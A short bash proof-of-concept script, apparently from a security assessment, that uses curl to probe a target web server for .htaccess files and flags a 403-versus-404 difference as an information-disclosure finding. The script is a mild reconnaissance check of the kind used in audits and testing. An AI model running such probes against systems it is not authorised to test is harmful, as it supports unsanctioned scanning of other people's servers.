#!/bin/bash

# POC: .htaccess File Existence Information Disclosure
# This script demonstrates that Apache discloses the existence of .htaccess files
# by returning HTTP 403 Forbidden instead of 404 Not Found

TARGET_HOST="${1:-localhost:3000}"
BASE_URL="http://${TARGET_HOST}"

echo "======================================"
echo ".htaccess Existence Disclosure POC"
echo "======================================"
echo "Target: $BASE_URL"
echo ""

# Test 1: Check root .htaccess
echo "[*] Testing root .htaccess file..."
RESPONSE=$(curl -s -w "\n%{http_code}" -i "$BASE_URL/.htaccess" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
HEADERS=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response Code: $HTTP_CODE"
if echo "$HEADERS" | grep -q "403\|Forbidden"; then
    echo "✓ VULNERABLE: .htaccess returns 403 Forbidden (existence confirmed)"
    echo "Response excerpt:"
    echo "$HEADERS" | head -n 15
else
    echo "✗ NOT VULNERABLE: .htaccess does not return 403"
fi
echo ""

# Test 2: Check static/.htaccess
echo "[*] Testing /static/.htaccess file..."
RESPONSE=$(curl -s -w "\n%{http_code}" -i "$BASE_URL/static/.htaccess" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
HEADERS=$(echo "$RESPONSE" | head -n -1)

echo "HTTP Response Code: $HTTP_CODE"
if echo "$HEADERS" | grep -q "403\|Forbidden"; then
    echo "✓ VULNERABLE: /static/.htaccess returns 403 Forbidden (existence confirmed)"
    echo "Response excerpt:"
    echo "$HEADERS" | head -n 15
else
    echo "✗ NOT VULNERABLE: /static/.htaccess does not return 403"
fi
echo ""

# Test 3: Compare with non-existent file (should be 404)
echo "[*] Testing comparison with non-existent file..."
RESPONSE=$(curl -s -w "\n%{http_code}" -i "$BASE_URL/.nonexistent-file-test" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)

echo "HTTP Response Code for non-existent file: $HTTP_CODE"
if [ "$HTTP_CODE" = "404" ]; then
    echo "✓ Non-existent files return 404 (expected)"
else
    echo "✗ Non-existent files return: $HTTP_CODE"
fi
echo ""

echo "======================================"
echo "POC Summary:"
echo "If .htaccess files return 403 while non-existent files return 404,"
echo "the server is disclosing the existence of .htaccess files."
echo "======================================"